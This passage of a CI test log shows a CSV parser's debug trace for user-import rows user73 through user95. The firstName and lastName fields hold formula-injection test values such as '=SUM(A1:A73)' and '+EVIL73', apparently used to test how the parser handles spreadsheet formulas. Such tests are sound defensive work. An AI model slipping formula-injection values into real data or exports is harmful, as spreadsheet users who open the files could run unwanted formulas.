2025-11-18T17:35:41.6515179Z   columnMapping: {
2025-11-18T17:35:41.6515376Z     email: [33m0[39m,
2025-11-18T17:35:41.6515584Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6515783Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6516218Z     role: [33m3[39m,
2025-11-18T17:35:41.6516424Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6516639Z     password: [33m-1[39m
2025-11-18T17:35:41.6516916Z   }
2025-11-18T17:35:41.6517049Z }
2025-11-18T17:35:41.6517283Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6517580Z   email: [32m'user73@example.com'[39m,
2025-11-18T17:35:41.6517863Z   firstName: [32m'=SUM(A1:A73)'[39m,
2025-11-18T17:35:41.6518115Z   lastName: [32m'+EVIL73'[39m,
2025-11-18T17:35:41.6518326Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6518573Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6518704Z }
2025-11-18T17:35:41.6518889Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6519091Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6519835Z   cellValues: [ [32m'user74@example.com'[39m, [32m'=SUM(A1:A74)'[39m, [32m'+EVIL74'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6519980Z   columnMapping: {
2025-11-18T17:35:41.6520178Z     email: [33m0[39m,
2025-11-18T17:35:41.6520382Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6520586Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6520768Z     role: [33m3[39m,
2025-11-18T17:35:41.6520955Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6521155Z     password: [33m-1[39m
2025-11-18T17:35:41.6521270Z   }
2025-11-18T17:35:41.6521391Z }
2025-11-18T17:35:41.6521622Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6521912Z   email: [32m'user74@example.com'[39m,
2025-11-18T17:35:41.6522177Z   firstName: [32m'=SUM(A1:A74)'[39m,
2025-11-18T17:35:41.6522426Z   lastName: [32m'+EVIL74'[39m,
2025-11-18T17:35:41.6522639Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6522884Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6523008Z }
2025-11-18T17:35:41.6523189Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6523399Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6524125Z   cellValues: [ [32m'user75@example.com'[39m, [32m'=SUM(A1:A75)'[39m, [32m'+EVIL75'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6524277Z   columnMapping: {
2025-11-18T17:35:41.6524474Z     email: [33m0[39m,
2025-11-18T17:35:41.6524671Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6524864Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6525034Z     role: [33m3[39m,
2025-11-18T17:35:41.6525206Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6525392Z     password: [33m-1[39m
2025-11-18T17:35:41.6525507Z   }
2025-11-18T17:35:41.6525614Z }
2025-11-18T17:35:41.6525825Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6526097Z   email: [32m'user75@example.com'[39m,
2025-11-18T17:35:41.6526346Z   firstName: [32m'=SUM(A1:A75)'[39m,
2025-11-18T17:35:41.6526945Z   lastName: [32m'+EVIL75'[39m,
2025-11-18T17:35:41.6527156Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6527415Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6527535Z }
2025-11-18T17:35:41.6527716Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6527922Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6528655Z   cellValues: [ [32m'user76@example.com'[39m, [32m'=SUM(A1:A76)'[39m, [32m'+EVIL76'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6528805Z   columnMapping: {
2025-11-18T17:35:41.6528990Z     email: [33m0[39m,
2025-11-18T17:35:41.6529187Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6529378Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6529558Z     role: [33m3[39m,
2025-11-18T17:35:41.6529736Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6529932Z     password: [33m-1[39m
2025-11-18T17:35:41.6530050Z   }
2025-11-18T17:35:41.6530163Z }
2025-11-18T17:35:41.6530397Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6530673Z   email: [32m'user76@example.com'[39m,
2025-11-18T17:35:41.6530953Z   firstName: [32m'=SUM(A1:A76)'[39m,
2025-11-18T17:35:41.6531191Z   lastName: [32m'+EVIL76'[39m,
2025-11-18T17:35:41.6531392Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6531638Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6531755Z }
2025-11-18T17:35:41.6531935Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6532130Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6533029Z   cellValues: [ [32m'user77@example.com'[39m, [32m'=SUM(A1:A77)'[39m, [32m'+EVIL77'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6533210Z   columnMapping: {
2025-11-18T17:35:41.6533437Z     email: [33m0[39m,
2025-11-18T17:35:41.6533656Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6533860Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6534041Z     role: [33m3[39m,
2025-11-18T17:35:41.6534234Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6534450Z     password: [33m-1[39m
2025-11-18T17:35:41.6534571Z   }
2025-11-18T17:35:41.6534690Z }
2025-11-18T17:35:41.6534946Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6535255Z   email: [32m'user77@example.com'[39m,
2025-11-18T17:35:41.6535538Z   firstName: [32m'=SUM(A1:A77)'[39m,
2025-11-18T17:35:41.6535788Z   lastName: [32m'+EVIL77'[39m,
2025-11-18T17:35:41.6535998Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6536261Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6536377Z }
2025-11-18T17:35:41.6536565Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6536958Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6537726Z   cellValues: [ [32m'user78@example.com'[39m, [32m'=SUM(A1:A78)'[39m, [32m'+EVIL78'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6537880Z   columnMapping: {
2025-11-18T17:35:41.6538091Z     email: [33m0[39m,
2025-11-18T17:35:41.6538282Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6538467Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6538650Z     role: [33m3[39m,
2025-11-18T17:35:41.6538837Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6539028Z     password: [33m-1[39m
2025-11-18T17:35:41.6539157Z   }
2025-11-18T17:35:41.6539267Z }
2025-11-18T17:35:41.6539492Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6539789Z   email: [32m'user78@example.com'[39m,
2025-11-18T17:35:41.6540076Z   firstName: [32m'=SUM(A1:A78)'[39m,
2025-11-18T17:35:41.6540339Z   lastName: [32m'+EVIL78'[39m,
2025-11-18T17:35:41.6540566Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6540871Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6541001Z }
2025-11-18T17:35:41.6541207Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6541445Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6542238Z   cellValues: [ [32m'user79@example.com'[39m, [32m'=SUM(A1:A79)'[39m, [32m'+EVIL79'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6542402Z   columnMapping: {
2025-11-18T17:35:41.6542633Z     email: [33m0[39m,
2025-11-18T17:35:41.6542864Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6543078Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6543285Z     role: [33m3[39m,
2025-11-18T17:35:41.6543752Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6543991Z     password: [33m-1[39m
2025-11-18T17:35:41.6544124Z   }
2025-11-18T17:35:41.6544246Z }
2025-11-18T17:35:41.6544496Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6544826Z   email: [32m'user79@example.com'[39m,
2025-11-18T17:35:41.6545129Z   firstName: [32m'=SUM(A1:A79)'[39m,
2025-11-18T17:35:41.6545398Z   lastName: [32m'+EVIL79'[39m,
2025-11-18T17:35:41.6545628Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6545883Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6546004Z }
2025-11-18T17:35:41.6546204Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6546414Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6547356Z   cellValues: [ [32m'user80@example.com'[39m, [32m'=SUM(A1:A80)'[39m, [32m'+EVIL80'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6547522Z   columnMapping: {
2025-11-18T17:35:41.6547765Z     email: [33m0[39m,
2025-11-18T17:35:41.6547990Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6548210Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6548440Z     role: [33m3[39m,
2025-11-18T17:35:41.6548641Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6548869Z     password: [33m-1[39m
2025-11-18T17:35:41.6548994Z   }
2025-11-18T17:35:41.6549120Z }
2025-11-18T17:35:41.6549358Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6549680Z   email: [32m'user80@example.com'[39m,
2025-11-18T17:35:41.6549993Z   firstName: [32m'=SUM(A1:A80)'[39m,
2025-11-18T17:35:41.6550542Z   lastName: [32m'+EVIL80'[39m,
2025-11-18T17:35:41.6550825Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6551102Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6551238Z }
2025-11-18T17:35:41.6551428Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6551655Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6552446Z   cellValues: [ [32m'user81@example.com'[39m, [32m'=SUM(A1:A81)'[39m, [32m'+EVIL81'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6552605Z   columnMapping: {
2025-11-18T17:35:41.6552836Z     email: [33m0[39m,
2025-11-18T17:35:41.6553056Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6553272Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6553483Z     role: [33m3[39m,
2025-11-18T17:35:41.6553682Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6553894Z     password: [33m-1[39m
2025-11-18T17:35:41.6554025Z   }
2025-11-18T17:35:41.6554177Z }
2025-11-18T17:35:41.6554428Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6554733Z   email: [32m'user81@example.com'[39m,
2025-11-18T17:35:41.6555025Z   firstName: [32m'=SUM(A1:A81)'[39m,
2025-11-18T17:35:41.6555300Z   lastName: [32m'+EVIL81'[39m,
2025-11-18T17:35:41.6555529Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6555778Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6555908Z }
2025-11-18T17:35:41.6556099Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6556319Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6557277Z   cellValues: [ [32m'user82@example.com'[39m, [32m'=SUM(A1:A82)'[39m, [32m'+EVIL82'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6557453Z   columnMapping: {
2025-11-18T17:35:41.6557671Z     email: [33m0[39m,
2025-11-18T17:35:41.6557857Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6558048Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6558224Z     role: [33m3[39m,
2025-11-18T17:35:41.6558427Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6558645Z     password: [33m-1[39m
2025-11-18T17:35:41.6558782Z   }
2025-11-18T17:35:41.6558909Z }
2025-11-18T17:35:41.6559163Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6559486Z   email: [32m'user82@example.com'[39m,
2025-11-18T17:35:41.6559762Z   firstName: [32m'=SUM(A1:A82)'[39m,
2025-11-18T17:35:41.6560041Z   lastName: [32m'+EVIL82'[39m,
2025-11-18T17:35:41.6560270Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6560554Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6560681Z }
2025-11-18T17:35:41.6560873Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6561101Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6561971Z   cellValues: [ [32m'user83@example.com'[39m, [32m'=SUM(A1:A83)'[39m, [32m'+EVIL83'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6562410Z   columnMapping: {
2025-11-18T17:35:41.6562645Z     email: [33m0[39m,
2025-11-18T17:35:41.6562863Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6563086Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6563284Z     role: [33m3[39m,
2025-11-18T17:35:41.6563492Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6563708Z     password: [33m-1[39m
2025-11-18T17:35:41.6563858Z   }
2025-11-18T17:35:41.6563986Z }
2025-11-18T17:35:41.6564252Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6564600Z   email: [32m'user83@example.com'[39m,
2025-11-18T17:35:41.6564919Z   firstName: [32m'=SUM(A1:A83)'[39m,
2025-11-18T17:35:41.6565215Z   lastName: [32m'+EVIL83'[39m,
2025-11-18T17:35:41.6565440Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6565707Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6565832Z }
2025-11-18T17:35:41.6566026Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6566275Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6567282Z   cellValues: [ [32m'user84@example.com'[39m, [32m'=SUM(A1:A84)'[39m, [32m'+EVIL84'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6567440Z   columnMapping: {
2025-11-18T17:35:41.6567640Z     email: [33m0[39m,
2025-11-18T17:35:41.6567863Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6568074Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6568271Z     role: [33m3[39m,
2025-11-18T17:35:41.6568710Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6568987Z     password: [33m-1[39m
2025-11-18T17:35:41.6569115Z   }
2025-11-18T17:35:41.6569244Z }
2025-11-18T17:35:41.6569502Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6569830Z   email: [32m'user84@example.com'[39m,
2025-11-18T17:35:41.6570131Z   firstName: [32m'=SUM(A1:A84)'[39m,
2025-11-18T17:35:41.6570404Z   lastName: [32m'+EVIL84'[39m,
2025-11-18T17:35:41.6570635Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6570940Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6571074Z }
2025-11-18T17:35:41.6571293Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6571532Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6572305Z   cellValues: [ [32m'user85@example.com'[39m, [32m'=SUM(A1:A85)'[39m, [32m'+EVIL85'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6572468Z   columnMapping: {
2025-11-18T17:35:41.6572684Z     email: [33m0[39m,
2025-11-18T17:35:41.6572887Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6573086Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6573283Z     role: [33m3[39m,
2025-11-18T17:35:41.6573471Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6573674Z     password: [33m-1[39m
2025-11-18T17:35:41.6573795Z   }
2025-11-18T17:35:41.6573924Z }
2025-11-18T17:35:41.6574163Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6574498Z   email: [32m'user85@example.com'[39m,
2025-11-18T17:35:41.6574798Z   firstName: [32m'=SUM(A1:A85)'[39m,
2025-11-18T17:35:41.6575064Z   lastName: [32m'+EVIL85'[39m,
2025-11-18T17:35:41.6575283Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6575652Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6575796Z }
2025-11-18T17:35:41.6575992Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6576217Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6577172Z   cellValues: [ [32m'user86@example.com'[39m, [32m'=SUM(A1:A86)'[39m, [32m'+EVIL86'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6577348Z   columnMapping: {
2025-11-18T17:35:41.6577589Z     email: [33m0[39m,
2025-11-18T17:35:41.6577810Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6578024Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6578226Z     role: [33m3[39m,
2025-11-18T17:35:41.6578435Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6578663Z     password: [33m-1[39m
2025-11-18T17:35:41.6578779Z   }
2025-11-18T17:35:41.6578898Z }
2025-11-18T17:35:41.6579111Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6579424Z   email: [32m'user86@example.com'[39m,
2025-11-18T17:35:41.6579690Z   firstName: [32m'=SUM(A1:A86)'[39m,
2025-11-18T17:35:41.6579921Z   lastName: [32m'+EVIL86'[39m,
2025-11-18T17:35:41.6580324Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6580560Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6580683Z }
2025-11-18T17:35:41.6580853Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6581045Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6581709Z   cellValues: [ [32m'user87@example.com'[39m, [32m'=SUM(A1:A87)'[39m, [32m'+EVIL87'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6581850Z   columnMapping: {
2025-11-18T17:35:41.6582021Z     email: [33m0[39m,
2025-11-18T17:35:41.6582195Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6582370Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6582536Z     role: [33m3[39m,
2025-11-18T17:35:41.6582703Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6582898Z     password: [33m-1[39m
2025-11-18T17:35:41.6583042Z   }
2025-11-18T17:35:41.6583157Z }
2025-11-18T17:35:41.6583384Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6583673Z   email: [32m'user87@example.com'[39m,
2025-11-18T17:35:41.6583914Z   firstName: [32m'=SUM(A1:A87)'[39m,
2025-11-18T17:35:41.6584147Z   lastName: [32m'+EVIL87'[39m,
2025-11-18T17:35:41.6584335Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6584574Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6584686Z }
2025-11-18T17:35:41.6584859Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6585065Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6585950Z   cellValues: [ [32m'user88@example.com'[39m, [32m'=SUM(A1:A88)'[39m, [32m'+EVIL88'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6586109Z   columnMapping: {
2025-11-18T17:35:41.6586303Z     email: [33m0[39m,
2025-11-18T17:35:41.6586498Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6586674Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6587043Z     role: [33m3[39m,
2025-11-18T17:35:41.6587233Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6587419Z     password: [33m-1[39m
2025-11-18T17:35:41.6587530Z   }
2025-11-18T17:35:41.6587633Z }
2025-11-18T17:35:41.6587851Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6588111Z   email: [32m'user88@example.com'[39m,
2025-11-18T17:35:41.6588369Z   firstName: [32m'=SUM(A1:A88)'[39m,
2025-11-18T17:35:41.6588609Z   lastName: [32m'+EVIL88'[39m,
2025-11-18T17:35:41.6588795Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6589030Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6589139Z }
2025-11-18T17:35:41.6589314Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6589494Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6590180Z   cellValues: [ [32m'user89@example.com'[39m, [32m'=SUM(A1:A89)'[39m, [32m'+EVIL89'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6590315Z   columnMapping: {
2025-11-18T17:35:41.6590488Z     email: [33m0[39m,
2025-11-18T17:35:41.6590671Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6590850Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6591027Z     role: [33m3[39m,
2025-11-18T17:35:41.6591201Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6591400Z     password: [33m-1[39m
2025-11-18T17:35:41.6591513Z   }
2025-11-18T17:35:41.6591620Z }
2025-11-18T17:35:41.6591852Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6592121Z   email: [32m'user89@example.com'[39m,
2025-11-18T17:35:41.6592409Z   firstName: [32m'=SUM(A1:A89)'[39m,
2025-11-18T17:35:41.6592679Z   lastName: [32m'+EVIL89'[39m,
2025-11-18T17:35:41.6592907Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6593170Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6593292Z }
2025-11-18T17:35:41.6593493Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6593709Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6594467Z   cellValues: [ [32m'user90@example.com'[39m, [32m'=SUM(A1:A90)'[39m, [32m'+EVIL90'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6594629Z   columnMapping: {
2025-11-18T17:35:41.6594855Z     email: [33m0[39m,
2025-11-18T17:35:41.6595067Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6595271Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6595471Z     role: [33m3[39m,
2025-11-18T17:35:41.6595674Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6595900Z     password: [33m-1[39m
2025-11-18T17:35:41.6596306Z   }
2025-11-18T17:35:41.6596438Z }
2025-11-18T17:35:41.6596687Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6597247Z   email: [32m'user90@example.com'[39m,
2025-11-18T17:35:41.6597556Z   firstName: [32m'=SUM(A1:A90)'[39m,
2025-11-18T17:35:41.6597817Z   lastName: [32m'+EVIL90'[39m,
2025-11-18T17:35:41.6598044Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6598326Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6598461Z }
2025-11-18T17:35:41.6598657Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6598884Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6599659Z   cellValues: [ [32m'user91@example.com'[39m, [32m'=SUM(A1:A91)'[39m, [32m'+EVIL91'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6599826Z   columnMapping: {
2025-11-18T17:35:41.6600058Z     email: [33m0[39m,
2025-11-18T17:35:41.6600271Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6600484Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6600676Z     role: [33m3[39m,
2025-11-18T17:35:41.6600886Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6601116Z     password: [33m-1[39m
2025-11-18T17:35:41.6601242Z   }
2025-11-18T17:35:41.6601377Z }
2025-11-18T17:35:41.6601615Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6601942Z   email: [32m'user91@example.com'[39m,
2025-11-18T17:35:41.6602220Z   firstName: [32m'=SUM(A1:A91)'[39m,
2025-11-18T17:35:41.6602476Z   lastName: [32m'+EVIL91'[39m,
2025-11-18T17:35:41.6602917Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6603209Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6603340Z }
2025-11-18T17:35:41.6603529Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6603733Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6604482Z   cellValues: [ [32m'user92@example.com'[39m, [32m'=SUM(A1:A92)'[39m, [32m'+EVIL92'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6604648Z   columnMapping: {
2025-11-18T17:35:41.6604866Z     email: [33m0[39m,
2025-11-18T17:35:41.6605076Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6605314Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6605516Z     role: [33m3[39m,
2025-11-18T17:35:41.6605723Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6605945Z     password: [33m-1[39m
2025-11-18T17:35:41.6606079Z   }
2025-11-18T17:35:41.6606204Z }
2025-11-18T17:35:41.6606419Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6606701Z   email: [32m'user92@example.com'[39m,
2025-11-18T17:35:41.6607232Z   firstName: [32m'=SUM(A1:A92)'[39m,
2025-11-18T17:35:41.6607500Z   lastName: [32m'+EVIL92'[39m,
2025-11-18T17:35:41.6607722Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6608000Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6608124Z }
2025-11-18T17:35:41.6608315Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6608555Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6609316Z   cellValues: [ [32m'user93@example.com'[39m, [32m'=SUM(A1:A93)'[39m, [32m'+EVIL93'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6609480Z   columnMapping: {
2025-11-18T17:35:41.6609688Z     email: [33m0[39m,
2025-11-18T17:35:41.6609927Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6610135Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6610341Z     role: [33m3[39m,
2025-11-18T17:35:41.6610547Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6610769Z     password: [33m-1[39m
2025-11-18T17:35:41.6610901Z   }
2025-11-18T17:35:41.6611023Z }
2025-11-18T17:35:41.6611276Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6611619Z   email: [32m'user93@example.com'[39m,
2025-11-18T17:35:41.6611918Z   firstName: [32m'=SUM(A1:A93)'[39m,
2025-11-18T17:35:41.6612208Z   lastName: [32m'+EVIL93'[39m,
2025-11-18T17:35:41.6612435Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6612715Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6612840Z }
2025-11-18T17:35:41.6613043Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6613269Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6614034Z   cellValues: [ [32m'user94@example.com'[39m, [32m'=SUM(A1:A94)'[39m, [32m'+EVIL94'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6614476Z   columnMapping: {
2025-11-18T17:35:41.6614712Z     email: [33m0[39m,
2025-11-18T17:35:41.6614931Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6615130Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6615323Z     role: [33m3[39m,
2025-11-18T17:35:41.6615515Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6615733Z     password: [33m-1[39m
2025-11-18T17:35:41.6615849Z   }
2025-11-18T17:35:41.6615971Z }
2025-11-18T17:35:41.6616325Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6616664Z   email: [32m'user94@example.com'[39m,
2025-11-18T17:35:41.6617162Z   firstName: [32m'=SUM(A1:A94)'[39m,
2025-11-18T17:35:41.6617444Z   lastName: [32m'+EVIL94'[39m,
2025-11-18T17:35:41.6617675Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6617947Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6618070Z }
2025-11-18T17:35:41.6618273Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6618503Z   totalCells: [33m4[39m,
2025-11-18T17:35:41.6619273Z   cellValues: [ [32m'user95@example.com'[39m, [32m'=SUM(A1:A95)'[39m, [32m'+EVIL95'[39m, [32m'docente'[39m ],
2025-11-18T17:35:41.6619449Z   columnMapping: {
2025-11-18T17:35:41.6619682Z     email: [33m0[39m,
2025-11-18T17:35:41.6619890Z     firstName: [33m1[39m,
2025-11-18T17:35:41.6620098Z     lastName: [33m2[39m,
2025-11-18T17:35:41.6620299Z     role: [33m3[39m,
2025-11-18T17:35:41.6620491Z     rut: [33m-1[39m,
2025-11-18T17:35:41.6620709Z     password: [33m-1[39m
2025-11-18T17:35:41.6621063Z   }
2025-11-18T17:35:41.6621222Z }
2025-11-18T17:35:41.6621477Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:41.6621825Z   email: [32m'user95@example.com'[39m,
2025-11-18T17:35:41.6622120Z   firstName: [32m'=SUM(A1:A95)'[39m,
2025-11-18T17:35:41.6622386Z   lastName: [32m'+EVIL95'[39m,
2025-11-18T17:35:41.6622613Z   role: [32m'docente'[39m,
2025-11-18T17:35:41.6622874Z   password: [32m'MISSING'[39m
2025-11-18T17:35:41.6623001Z }
2025-11-18T17:35:41.6623192Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:41.6623413Z   totalCells: [33m4[39m,
